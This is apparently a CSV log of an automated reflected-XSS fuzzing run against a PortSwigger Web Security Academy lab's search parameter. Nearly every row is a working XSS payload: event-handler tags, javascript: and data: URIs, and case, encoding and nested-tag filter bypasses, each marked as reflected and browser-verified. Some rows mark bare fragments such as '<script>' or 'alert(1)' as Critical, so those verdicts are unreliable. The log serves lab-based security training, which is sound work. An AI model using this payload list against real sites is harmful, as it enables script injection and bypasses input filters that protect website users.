Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 14:22:07.861,2026-01-10 14:22:08.037,0.177,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onmousedown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:08.037,2026-01-10 14:22:08.207,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onmouseenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:08.208,2026-01-10 14:22:08.385,0.177,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onmouseleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:08.385,2026-01-10 14:22:08.559,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onmousemove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:08.559,2026-01-10 14:22:08.800,0.241,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onmouseout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:08.800,2026-01-10 14:22:08.968,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:08.968,2026-01-10 14:22:09.285,0.317,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onmouseup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:09.285,2026-01-10 14:22:09.452,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onmousewheel=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:09.452,2026-01-10 14:22:09.651,0.199,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:09.651,2026-01-10 14:22:09.819,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onmoveend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:09.819,2026-01-10 14:22:10.064,0.246,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onmovestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:10.064,2026-01-10 14:22:10.236,0.172,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:10.236,2026-01-10 14:22:10.558,0.322,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onpropertychange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:10.558,2026-01-10 14:22:10.728,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onreadystatechange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:10.728,2026-01-10 14:22:11.039,0.311,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:11.039,2026-01-10 14:22:11.209,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:11.209,2026-01-10 14:22:11.519,0.310,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onresizeend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:11.519,2026-01-10 14:22:11.727,0.208,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onresizestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:11.727,2026-01-10 14:22:11.999,0.272,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onrowenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:11.999,2026-01-10 14:22:12.169,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onrowexit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:12.169,2026-01-10 14:22:12.479,0.310,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onrowsdelete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:12.479,2026-01-10 14:22:12.646,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onrowsinserted=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:12.646,2026-01-10 14:22:12.958,0.312,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:12.958,2026-01-10 14:22:13.128,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:13.128,2026-01-10 14:22:13.439,0.311,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onselectionchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:13.439,2026-01-10 14:22:13.758,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onselectstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:13.758,2026-01-10 14:22:13.928,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:13.928,2026-01-10 14:22:14.197,0.269,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:14.197,2026-01-10 14:22:14.398,0.201,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:14.398,2026-01-10 14:22:14.574,0.176,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:14.574,2026-01-10 14:22:14.746,0.172,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,javascript:alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:14.746,2026-01-10 14:22:15.038,0.292,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,javascript:alert('XSS'),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:15.038,2026-01-10 14:22:15.246,0.209,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,javascript:prompt(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:15.246,2026-01-10 14:22:15.419,0.172,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,javascript:confirm(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:15.419,2026-01-10 14:22:15.578,0.159,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"data:text/html,<script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:15.578,2026-01-10 14:22:15.743,0.165,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"data:text/html,<img src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:15.743,2026-01-10 14:22:15.916,0.173,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:15.916,2026-01-10 14:22:16.088,0.172,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:16.088,2026-01-10 14:22:16.249,0.161,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:16.249,2026-01-10 14:22:16.417,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:16.417,2026-01-10 14:22:16.583,0.166,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:16.583,2026-01-10 14:22:16.753,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:16.753,2026-01-10 14:22:16.932,0.179,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:16.932,2026-01-10 14:22:17.118,0.186,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:17.118,2026-01-10 14:22:17.439,0.321,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:17.439,2026-01-10 14:22:17.694,0.256,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:17.694,2026-01-10 14:22:17.918,0.223,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:17.918,2026-01-10 14:22:18.238,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:18.238,2026-01-10 14:22:18.447,0.210,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:18.448,2026-01-10 14:22:18.719,0.272,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:18.719,2026-01-10 14:22:19.038,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:19.038,2026-01-10 14:22:19.358,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:19.358,2026-01-10 14:22:19.557,0.199,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<q/onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:19.557,2026-01-10 14:22:19.839,0.282,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:19.839,2026-01-10 14:22:20.159,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerror=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:20.159,2026-01-10 14:22:20.333,0.175,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:20.333,2026-01-10 14:22:20.507,0.173,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<body onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:20.507,2026-01-10 14:22:20.683,0.177,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:20.683,2026-01-10 14:22:20.858,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:20.858,2026-01-10 14:22:21.116,0.259,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,</script>,ESCAPED,No,,Low
2026-01-10 14:22:21.116,2026-01-10 14:22:21.439,0.323,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:21.439,2026-01-10 14:22:21.759,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:21.759,2026-01-10 14:22:21.928,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:21.928,2026-01-10 14:22:22.096,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<ScRiPt>alert(1)</ScRiPt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:22.096,2026-01-10 14:22:22.259,0.164,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<sCrIpT>alert(1)</sCrIpT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:22.259,2026-01-10 14:22:22.559,0.300,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<SCRIPT>alert(1)</SCRIPT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:22.559,2026-01-10 14:22:22.879,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<IMG SRC=x ONERROR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:22.879,2026-01-10 14:22:23.198,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<ImG sRc=x OnErRoR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:23.198,2026-01-10 14:22:23.399,0.201,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<SVG ONLOAD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:23.399,2026-01-10 14:22:23.679,0.280,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<SvG oNlOaD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:23.679,2026-01-10 14:22:23.999,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,< script >alert(1)< / script >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:23.999,2026-01-10 14:22:24.169,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,< img src=x onerror=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:24.169,2026-01-10 14:22:24.479,0.310,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,< svg onload=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:24.479,2026-01-10 14:22:24.648,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<scr<script>ipt>alert(1)</scr</script>ipt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:24.648,2026-01-10 14:22:24.819,0.172,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<<script>script>alert(1)<</script>/script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:24.819,2026-01-10 14:22:24.987,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<img src=""x""onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:24.987,2026-01-10 14:22:25.280,0.292,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:25.280,2026-01-10 14:22:25.448,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg//onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:25.448,2026-01-10 14:22:25.759,0.311,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,%3Cscript%3Ealert(1)%3C/script%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:25.759,2026-01-10 14:22:26.079,0.321,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,%3Cimg%20src=x%20onerror=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:26.079,2026-01-10 14:22:26.248,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,%3Csvg%20onload=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:26.248,2026-01-10 14:22:26.417,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>alert`1`</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:26.417,2026-01-10 14:22:26.718,0.301,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:26.718,2026-01-10 14:22:26.998,0.280,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:26.998,2026-01-10 14:22:27.197,0.199,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>/**/alert(1)/**/</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:27.197,2026-01-10 14:22:27.519,0.322,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script><!---->alert(1)<!----></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:27.519,2026-01-10 14:22:27.690,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerror=/**/alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:27.690,2026-01-10 14:22:27.999,0.309,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>eval('alert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:27.999,2026-01-10 14:22:28.319,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<script>eval(""alert(1)"")</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:28.319,2026-01-10 14:22:28.487,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>eval(atob('YWxlcnQoMSk='))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:28.487,2026-01-10 14:22:28.802,0.315,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerror=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:28.802,2026-01-10 14:22:29.118,0.316,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg onload=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:29.118,2026-01-10 14:22:29.440,0.322,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:29.440,2026-01-10 14:22:29.607,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>new Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:29.607,2026-01-10 14:22:29.777,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerror=Function('alert(1)')()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:29.777,2026-01-10 14:22:30.079,0.302,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<script>setTimeout('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:30.079,2026-01-10 14:22:30.399,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<script>setTimeout(""alert(1)"",0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:30.399,2026-01-10 14:22:30.569,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<script>setInterval('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:30.569,2026-01-10 14:22:30.737,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<img src=x onerror=setTimeout('alert(1)',0)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:30.737,2026-01-10 14:22:31.039,0.302,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>location='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:31.039,2026-01-10 14:22:31.359,0.320,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>location.href='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:31.359,2026-01-10 14:22:31.529,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<script>location=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,49,41)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:31.529,2026-01-10 14:22:31.703,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:31.703,2026-01-10 14:22:31.999,0.296,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:31.999,2026-01-10 14:22:32.173,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<img src=x onerror=\u0061lert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:32.173,2026-01-10 14:22:32.477,0.304,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:32.477,2026-01-10 14:22:32.653,0.175,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:32.653,2026-01-10 14:22:32.822,0.170,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<script>alert(String.fromCharCode(88,83,83))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:32.822,2026-01-10 14:22:32.996,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:32.996,2026-01-10 14:22:33.170,0.173,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>document.write('<img src=x onerror=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:33.170,2026-01-10 14:22:33.343,0.173,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>document.write('<svg onload=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:33.343,2026-01-10 14:22:33.508,0.165,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:33.508,2026-01-10 14:22:33.678,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<a href=javascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:33.678,2026-01-10 14:22:33.853,0.174,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<a href=""javascript:alert(1)"">X</a>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:33.853,2026-01-10 14:22:34.018,0.166,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<a href='javascript:alert(1)'>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:34.019,2026-01-10 14:22:34.197,0.178,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<a href=j&#x61vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:34.197,2026-01-10 14:22:34.397,0.200,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<a href=j&#97vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:34.397,2026-01-10 14:22:34.565,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<form><button formaction=javascript:alert(1)>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:34.565,2026-01-10 14:22:34.740,0.175,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<form><input formaction=javascript:alert(1) type=submit value=X></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:34.740,2026-01-10 14:22:34.907,0.167,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<form><input type=submit formaction=javascript:alert(1) value=X></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:34.907,2026-01-10 14:22:35.164,0.257,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<base href=javascript:alert(1)//>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:35.164,2026-01-10 14:22:35.333,0.169,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<script>import('data:text/javascript,alert(1)')</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:35.333,2026-01-10 14:22:35.497,0.164,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:35.497,2026-01-10 14:22:35.668,0.171,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<div id=x tabindex=1 onactivate=alert(1)></div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:35.668,2026-01-10 14:22:35.836,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<div contenteditable onblur=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:35.837,2026-01-10 14:22:36.013,0.176,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<div draggable=true ondrag=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:36.013,2026-01-10 14:22:36.319,0.306,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg><animate onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:36.319,2026-01-10 14:22:36.638,0.319,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg><set onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:36.638,2026-01-10 14:22:36.807,0.168,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg><animatemotion onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 14:22:36.807,2026-01-10 14:22:37.118,0.311,https://0acb006504574be78079030800b600de.web-security-academy.net/,GET,search,<svg><animatetransform onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
